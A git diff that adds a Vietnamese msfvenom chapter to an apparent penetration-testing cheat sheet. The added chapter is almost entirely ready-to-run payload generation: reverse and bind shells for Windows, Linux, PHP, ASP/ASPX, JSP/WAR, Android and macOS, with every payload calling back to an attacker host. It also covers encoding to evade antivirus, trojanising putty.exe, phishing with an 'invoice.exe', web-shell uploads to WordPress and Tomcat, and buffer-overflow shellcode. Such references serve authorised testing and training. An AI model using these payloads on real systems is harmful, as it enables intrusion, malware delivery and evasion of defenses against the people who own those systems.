@@ -10,6 +10,7 @@
 | [WPScan](#wpscan) | WordPress security scanner — enumerate user, plugin, theme, brute force | Reconnaissance / Exploitation |
 | [WPVulnDB](#wpvulndb) | Database lỗ hổng WordPress — tra cứu CVE theo plugin/theme/core version | Research / Exploitation |
 | [Metasploit](#metasploit) | Framework khai thác lỗ hổng — tích hợp exploit, payload, post-exploitation | Exploitation / Post-Exploitation |
+| [msfvenom](#msfvenom) | Tạo payload độc lập — reverse shell, bind shell, webshell cho mọi nền tảng | Exploitation |
 
 ---
 
@@ -1202,3 +1203,402 @@ run post/multi/recon/local_exploit_suggester
 - Dùng `set PAYLOAD php/meterpreter_reverse_tcp` (stageless) khi mạng không ổn định
 - Sau khi có shell, đọc `wp-config.php` ngay — chứa DB credential có thể dùng để leo thang thêm
 - Dùng `sessions -u <id>` để upgrade shell thường lên Meterpreter nếu cần
+
+---
+
+# msfvenom
+
+**Tích hợp trong:** Metasploit Framework
+**Tác giả:** Rapid7
+**Ngôn ngữ:** Ruby
+
+## Khái niệm
+
+msfvenom là tool **tạo payload độc lập** của Metasploit — kết hợp `msfpayload` và `msfencode` thành một lệnh duy nhất. Dùng để tạo file thực thi, script, shellcode chứa reverse shell / bind shell cho mọi nền tảng mà không cần msfconsole đang chạy.
+
+**Dùng khi nào:**
+- Cần tạo payload để upload lên target (web shell, EXE, ELF, APK...)
+- Cần shellcode nhúng vào exploit tự viết
+- Cần encode payload để bypass AV cơ bản
+- Target không có kết nối internet → tạo payload offline rồi chuyển sang
+
+---
+
+## Cú pháp cơ bản
+
+```
+msfvenom -p <payload> [options] LHOST=<ip> LPORT=<port> -f <format> -o <output>
+```
+
+---
+
+## Các cờ quan trọng
+
+| Cờ | Mô tả |
+|----|-------|
+| `-p <payload>` | Payload sử dụng |
+| `LHOST=<ip>` | IP attacker nhận kết nối (reverse) |
+| `LPORT=<port>` | Port attacker lắng nghe |
+| `RHOST=<ip>` | IP target (bind shell) |
+| `-f <format>` | Định dạng output (exe, elf, php, raw, py...) |
+| `-o <file>` | File output |
+| `-e <encoder>` | Encoder để obfuscate payload |
+| `-i <n>` | Số lần encode lặp lại |
+| `-b <chars>` | Bad characters cần tránh (buffer overflow) |
+| `-n <n>` | Thêm n byte NOP sled trước payload |
+| `--smallest` | Tạo payload nhỏ nhất có thể |
+| `-a <arch>` | Architecture (x86, x64, arm...) |
+| `--platform <os>` | Platform (windows, linux, android...) |
+| `-l payloads` | Liệt kê tất cả payload |
+| `-l formats` | Liệt kê tất cả format output |
+| `-l encoders` | Liệt kê tất cả encoder |
+
+---
+
+## Liệt kê payload / format / encoder
+
+```bash
+# Xem tất cả payload
+msfvenom -l payloads
+
+# Lọc theo keyword
+msfvenom -l payloads | grep "windows/x64"
+msfvenom -l payloads | grep "php"
+msfvenom -l payloads | grep "linux"
+
+# Xem tất cả format output
+msfvenom -l formats
+
+# Xem tất cả encoder
+msfvenom -l encoders
+
+# Xem option của một payload cụ thể
+msfvenom -p windows/meterpreter/reverse_tcp --list-options
+```
+
+---
+
+## Payload phổ biến theo nền tảng
+
+### Windows
+
+```bash
+# Reverse TCP — Meterpreter (staged)
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f exe -o shell_x86.exe
+
+# Reverse TCP — Meterpreter x64 (staged)
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f exe -o shell_x64.exe
+
+# Reverse TCP — Meterpreter x64 stageless
+msfvenom -p windows/x64/meterpreter_reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f exe -o shell_stageless.exe
+
+# Reverse HTTPS — traffic trông như HTTPS bình thường
+msfvenom -p windows/x64/meterpreter/reverse_https \
+  LHOST=192.168.1.100 LPORT=443 \
+  -f exe -o shell_https.exe
+
+# Bind TCP — target lắng nghe, attacker kết nối vào
+msfvenom -p windows/x64/meterpreter/bind_tcp \
+  RHOST=192.168.1.10 LPORT=4444 \
+  -f exe -o bind_shell.exe
+
+# DLL injection
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f dll -o evil.dll
+
+# PowerShell payload (không cần file EXE)
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f psh -o shell.ps1
+```
+
+### Linux
+
+```bash
+# Reverse TCP — ELF x86
+msfvenom -p linux/x86/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f elf -o shell_x86.elf
+
+# Reverse TCP — ELF x64
+msfvenom -p linux/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f elf -o shell_x64.elf
+
+# Stageless ELF x64
+msfvenom -p linux/x64/meterpreter_reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f elf -o shell_stageless.elf
+
+# Shell đơn giản (không cần Meterpreter)
+msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f elf -o simple_shell.elf
+```
+
+### Web — PHP
+
+```bash
+# PHP Meterpreter (staged)
+msfvenom -p php/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f raw -o shell.php
+
+# PHP shell đơn giản (stageless)
+msfvenom -p php/reverse_php \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f raw -o simple_shell.php
+
+# Sau khi tạo — thêm <?php ở đầu nếu thiếu
+echo "<?php" | cat - shell.php > shell_fixed.php
+```
+
+### Web — ASP / ASPX (Windows IIS)
+
+```bash
+# ASP reverse shell
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f asp -o shell.asp
+
+# ASPX reverse shell
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f aspx -o shell.aspx
+```
+
+### Web — JSP / WAR (Java / Tomcat)
+
+```bash
+# JSP reverse shell
+msfvenom -p java/jsp_shell_reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f raw -o shell.jsp
+
+# WAR file (deploy lên Tomcat manager)
+msfvenom -p java/jsp_shell_reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f war -o shell.war
+```
+
+### Android
+
+```bash
+# APK reverse shell
+msfvenom -p android/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -o evil.apk
+```
+
+### macOS
+
+```bash
+# macOS reverse shell
+msfvenom -p osx/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f macho -o shell.macho
+```
+
+### Shellcode (nhúng vào exploit)
+
+```bash
+# Raw shellcode — C format
+msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f c
+
+# Raw shellcode — Python format
+msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f python
+
+# Raw shellcode — hex
+msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f hex
+```
+
+---
+
+## Encoding — Bypass AV cơ bản
+
+```bash
+# Encode với shikata_ga_nai (x86, phổ biến nhất)
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -e x86/shikata_ga_nai -i 5 \
+  -f exe -o encoded_shell.exe
+
+# Encode x64
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -e x64/xor_dynamic -i 3 \
+  -f exe -o encoded_x64.exe
+
+# Tránh bad characters (dùng trong buffer overflow)
+msfvenom -p windows/shell_reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -b "\x00\x0a\x0d" \
+  -f c
+```
+
+> Encoding đơn giản không đủ bypass AV hiện đại — chỉ hiệu quả với AV cũ hoặc trong lab.
+
+---
+
+## Nhúng payload vào file hợp lệ
+
+```bash
+# Nhúng vào EXE có sẵn (putty.exe, notepad.exe...)
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -x /path/to/putty.exe \
+  -k \
+  -f exe -o putty_evil.exe
+# -x : file template
+# -k : giữ chức năng gốc của file template
+```
+
+---
+
+## Ví dụ minh họa theo kịch bản
+
+### Kịch bản 1 — Upload PHP shell lên WordPress
+
+```bash
+# [ATTACKER] — Tạo PHP Meterpreter shell
+msfvenom -p php/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f raw -o wp_shell.php
+
+# Mở listener trong msfconsole
+use exploit/multi/handler
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+run -j
+
+# Upload wp_shell.php lên WordPress qua theme editor / plugin upload
+# Truy cập file → nhận Meterpreter session
+```
+
+---
+
+### Kịch bản 2 — Windows EXE qua SMB / phishing
+
+```bash
+# [ATTACKER] — Tạo EXE x64 stageless (không cần stage download)
+msfvenom -p windows/x64/meterpreter_reverse_tcp \
+  LHOST=192.168.1.100 LPORT=443 \
+  -f exe -o invoice.exe
+
+# Mở listener
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter_reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 443
+run -j
+
+# Chuyển invoice.exe sang target qua SMB / phishing
+# Target chạy file → nhận Meterpreter session
+```
+
+---
+
+### Kịch bản 3 — WAR shell lên Tomcat Manager
+
+```bash
+# [ATTACKER] — Tạo WAR file
+msfvenom -p java/jsp_shell_reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f war -o shell.war
+
+# Mở listener
+use exploit/multi/handler
+set PAYLOAD java/jsp_shell_reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+run -j
+
+# [ATTACKER] — Deploy WAR lên Tomcat Manager (cần credential)
+# http://target.lab:8080/manager/html → Upload → Deploy shell.war
+# Truy cập: http://target.lab:8080/shell/
+# → nhận reverse shell
+```
+
+---
+
+### Kịch bản 4 — Shellcode cho buffer overflow
+
+```bash
+# [ATTACKER] — Tạo shellcode tránh bad chars \x00\x0a\x0d
+msfvenom -p windows/shell_reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -b "\x00\x0a\x0d" \
+  -f python \
+  -v shellcode
+
+# Output dạng Python variable:
+# shellcode =  b""
+# shellcode += b"\xdb\xc0\xd9\x74\x24\xf4..."
+
+# Nhúng shellcode vào exploit script
+```
+
+---
+
+### Kịch bản 5 — Linux ELF qua file upload / LFI
+
+```bash
+# [ATTACKER] — Tạo ELF x64
+msfvenom -p linux/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f elf -o shell.elf
+
+chmod +x shell.elf
+
+# Mở listener
+use exploit/multi/handler
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+run -j
+
+# Upload shell.elf lên target qua file upload vuln
+# Thực thi: curl http://target.lab/uploads/shell.elf → nhận session
+```
+
+---
+
+## Bảng tóm tắt payload theo mục đích
+
+| Mục đích | Payload | Format |
+|----------|---------|--------|
+| Windows reverse shell | `windows/x64/meterpreter/reverse_tcp` | `exe` |
+| Windows HTTPS evasion | `windows/x64/meterpreter/reverse_https` | `exe` |
+| Linux reverse shell | `linux/x64/meterpreter/reverse_tcp` | `elf` |
+| PHP web shell | `php/meterpreter/reverse_tcp` | `raw` |
+| ASP web shell (IIS) | `windows/meterpreter/reverse_tcp` | `asp` |
+| ASPX web shell (IIS) | `windows/meterpreter/reverse_tcp` | `aspx` |
+| Tomcat deploy | `java/jsp_shell_reverse_tcp` | `war` |
+| Android | `android/meterpreter/reverse_tcp` | `apk` |
+| Buffer overflow | `windows/shell_reverse_tcp` | `c` / `python` |
+| PowerShell | `windows/x64/meterpreter/reverse_tcp` | `psh` |
+
+---
+
+## Tips
+
+- Dùng `LPORT=443` hoặc `LPORT=80` — outbound traffic trên các port này thường không bị chặn
+- Stageless payload (`meterpreter_reverse_tcp` với dấu `_`) ổn định hơn khi mạng không tốt
+- Luôn mở listener trước khi chạy payload trên target
+- Dùng `reverse_https` thay `reverse_tcp` khi cần traffic trông hợp lệ hơn
+- `-b "\x00"` là bad char tối thiểu cần tránh trong hầu hết buffer overflow
+- Kiểm tra payload hoạt động trong lab trước khi dùng trong pentest thực tế
